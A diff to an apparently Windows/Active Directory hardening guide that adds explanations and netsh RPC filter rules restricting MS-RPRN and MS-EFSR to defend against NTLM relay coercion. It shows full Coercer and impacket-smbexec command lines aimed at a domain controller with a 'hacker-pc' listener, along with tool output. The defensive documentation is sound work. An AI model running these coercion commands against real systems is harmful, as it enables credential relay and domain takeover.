@@ -65,6 +65,7 @@ footer-right: "\\hspace{1cm}"
 | SIEM         | Security Information and Event Management             |
 | ITDR         | Identity Threat Detection and Response                |
 | EDR          | Endpoint Detection and Response                       |
+| EFS          | Encrypting File System                                |
 
 [Admin Model]: https://petri.com/use-microsofts-active-directory-tier-administrative-model/
 [System Center Operations Manager]: https://learn.microsoft.com/en-us/system-center/scom/get-started
@@ -404,6 +405,8 @@ Microsoft Windows [Version 10.0.20348.2340]
 C:\Windows\system32>
 ```
 
+Multiple variants of this attack exist:
+
 ```shell
 impacket-smbexec 'contoso/Admin:Pa$$w0rd@dc01'
 ```
@@ -570,7 +573,7 @@ add filter
 The [\[MS-RPRN\]: Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) with UUID [12345678-1234-ABCD-EF00-0123456789AB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515) is exposed over the `\PIPE\spoolss` named pipe and is a popular target for initiating NTLM relay attacks:
 
 ```shell
-coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip dc01.contoso.com --listener-ip hacker-pc --filter-transport-name msrpc --filter-protocol MS-RPRN --always-continue
+coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip dc01.contoso.com --listener-ip hacker-pc --filter-protocol MS-RPRN --always-continue
 ```
 
 ```txt
@@ -582,6 +585,11 @@ coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --ta
 
 [info] Starting coerce mode
 [info] Scanning target dc01.contoso.com
+[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49668,54795,51120,51124,38901,38902,56954,5722
+[+] DCERPC port '51120' is accessible!
+   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
+      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.213.0.100\x00')
+      [!] (RPC_S_ACCESS_DENIED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.213.0.100\x00')
 [+] SMB named pipe '\PIPE\spoolss' is accessible!
    [+] Successful bind to interface (12345678-1234-abcd-ef00-0123456789ab, 1.0)!
       [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.213.0.100\x00')
@@ -600,41 +608,62 @@ add filter
 ```
 
 > [!NOTE]
-> In a future version of Windows Server, the MS-RPRN protocol will be [moved to a standalone TCP port](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print) by default.
+> In a future version of Windows Server, the MS-RPRN protocol will exclusively be [moved to a standalone TCP port](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print) by default.
 
 #### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
 
+The [\[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) is [available over multiple named pipes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2):
+
+| Named Pipe     | RPC Interface UUID                   |
+|----------------|--------------------------------------|
+| \\PIPE\\efsrpc | df1941c5-fe89-4e79-bf10-463657acf44d |
+| \\PIPE\\lsarpc | c681d488-d850-11d0-8c52-00c04fd90f7e |
+
+This protocol is yet another popular target for initiating NTLM relay attacks:
+
 ```shell
-coercer coerce --target-ip dc01 --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
+coercer coerce --target-ip dc01 --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com --filter-transport msrpc --filter-pipe lsarpc --filter-method EfsRpcAddUsersToFileEx --always-continue
 ```
 
 ```txt
-# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol
-# Named pipe: \PIPE\lsarpc
-# Require Kerberos authentication and packet encryption.
-# Not bulletproof, but blocks most hacktools.
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+
+[info] Starting coerce mode
+[info] Scanning target dc01
+[+] SMB named pipe '\PIPE\lsarpc' is accessible!
+   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
+      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\10.213.0.100\5jPfJ0a3\file.txt\x00')
+      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\10.213.0.100\OMEqbIHD\\x00')
+      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\10.213.0.100\sRuG4G51\x00')
+      [!] (RPC_S_ACCESS_DENIED) MS-EFSR──>EfsRpcAddUsersToFileEx(FileName='\\10.213.0.100@80/ZVi\share\file.txt\x00')
+[+] All done! Bye Bye!
+```
+
+In environments where EFS is not used, the MS-EFSR protocol could be disabled entirely. A more compatible approach would be to enforce Kerberos authentication and packet encryption on MS-EFSR connections. Although this solution is not bulletproof, it works against most hacktools. Here is the corresponding sequence of `netsh.exe` commands:
+
+```txt
+rpc filter
+
 add rule layer=um actiontype=permit filterkey=d71d00db-3eef-4935-bedf-20cf628abd9e
 add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
 add condition field=auth_type matchtype=equal data=16
 add condition field=auth_level matchtype=equal data=6
 add filter
 
-# Block MS-EFSR over \PIPE\lsarpc by default
 add rule layer=um actiontype=block filterkey=3a4cce27-a7fa-4248-b8b8-ef6439a2c0ff
 add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
 add filter
 
-# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol
-# Named pipe: \PIPE\efsrpc
-# Require Kerberos authentication and packet encryption.
-# Not bulletproof, but blocks most hacktools.
 add rule layer=um actiontype=permit filterkey=c5cf8020-c83c-4803-9241-8c7f3b10171f
 add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
 add condition field=auth_type matchtype=equal data=16
 add condition field=auth_level matchtype=equal data=6
 add filter
 
-# Block MS-EFSR over \PIPE\efsrpc by default
 add rule layer=um actiontype=block filterkey=9ad23a91-085d-4f99-ae15-85e0ad801278
 add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
 add filter
